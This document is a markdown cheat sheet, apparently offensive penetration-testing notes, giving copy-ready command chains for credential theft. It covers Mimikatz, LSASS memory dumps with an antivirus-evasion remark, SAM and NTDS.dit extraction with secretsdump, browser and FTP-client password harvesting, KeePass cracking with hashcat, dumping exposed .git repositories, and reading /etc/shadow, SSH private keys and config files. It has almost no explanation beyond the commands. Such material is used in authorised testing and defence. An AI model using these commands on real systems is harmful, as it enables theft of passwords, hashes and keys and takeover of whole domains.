# Credential Extraction Chains

## Mimikatz sekurlsa::logonpasswords
```powershell
# Requires SYSTEM or SeDebugPrivilege
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
# Look for: NTLM hashes, cleartext passwords, Kerberos tickets
```

## SAM + SYSTEM → secretsdump LOCAL
```bash
# On target (need admin):
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
# Transfer to attacker:
impacket-secretsdump -sam sam -system system LOCAL
```

## NTDS.dit + SYSTEM → all domain hashes
```bash
# Method 1: VSS shadow copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
reg save hklm\system C:\temp\system
# Method 2: Remote secretsdump (with DA creds):
impacket-secretsdump 'DOMAIN/Administrator'@DC-IP -hashes :NTHASH
# Method 3: Local extraction:
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

## LSASS Dump → pypykatz
```powershell
# Method 1: comsvcs.dll (no AV trigger usually)
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump LSASS_PID C:\temp\lsass.dmp full
# Get LSASS PID:
tasklist /fi "imagename eq lsass.exe"

# Method 2: procdump
.\procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp

# Parse on attacker:
pypykatz lsa minidump lsass.dmp
```

## DPAPI Credential Extraction
```powershell
# Find DPAPI blobs:
dir /s /b C:\Users\*\AppData\Local\Microsoft\Credentials\*
dir /s /b C:\Users\*\AppData\Roaming\Microsoft\Credentials\*
# Mimikatz:
.\mimikatz.exe "dpapi::cred /in:C:\Users\user\AppData\...\CREDENTIAL_BLOB" "exit"
.\mimikatz.exe "sekurlsa::dpapi" "exit"  # Get master keys
```

## Browser Credential Extraction
```bash
# Chrome/Edge stored passwords:
# On target: Copy Login Data and Local State files
# Tools: SharpChromium, HackBrowserData, LaZagne
.\SharpChromium.exe logins
.\LaZagne.exe browsers
```

## PowerShell History → Creds
```powershell
# Check all users' PS history:
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# Or:
Get-Content (Get-PSReadlineOption).HistorySavePath
# Look for: passwords in commands, credentials, tokens
```

## FileZilla / WinSCP Stored Creds
```powershell
# FileZilla:
type C:\Users\*\AppData\Roaming\FileZilla\recentservers.xml
type C:\Users\*\AppData\Roaming\FileZilla\sitemanager.xml
# WinSCP:
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions"
# Passwords are obfuscated, use winscppasswd to decrypt
```

## KeePass Database → Key File
```bash
# Find KeePass files:
Get-ChildItem -Path C:\ -Include *.kdbx -Recurse -ErrorAction SilentlyContinue
# Find key files:
Get-ChildItem -Path C:\ -Include *.key,*.keyx -Recurse -ErrorAction SilentlyContinue
# Crack with keepass2john:
keepass2john database.kdbx > hash.txt
hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt
# Or john:
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## .git History → Hardcoded Creds
```bash
# Dump git repo from web:
python3 git-dumper.py http://TARGET/.git/ ./repo
cd repo
git log --all --oneline
git diff HEAD~5
git log -p --all -S 'password'
git log -p --all -S 'secret'
# Check all commits for credentials
```

## Config Files → Creds
```bash
# High-value config files:
cat /var/www/html/wp-config.php          # WordPress DB creds
cat /var/www/html/configuration.php       # Joomla
cat /var/www/html/.env                    # Laravel/generic
cat /var/www/html/config/database.yml     # Rails
cat /var/www/html/web.config              # ASP.NET (connection strings)
cat /etc/shadow                           # Linux password hashes
cat /home/*/.bash_history                 # Command history
cat /home/*/.ssh/id_rsa                   # SSH private keys

# Windows:
type C:\inetpub\wwwroot\web.config
type C:\Windows\Panther\Unattend.xml      # Install passwords
type C:\Windows\Panther\unattend\Unattend.xml
```
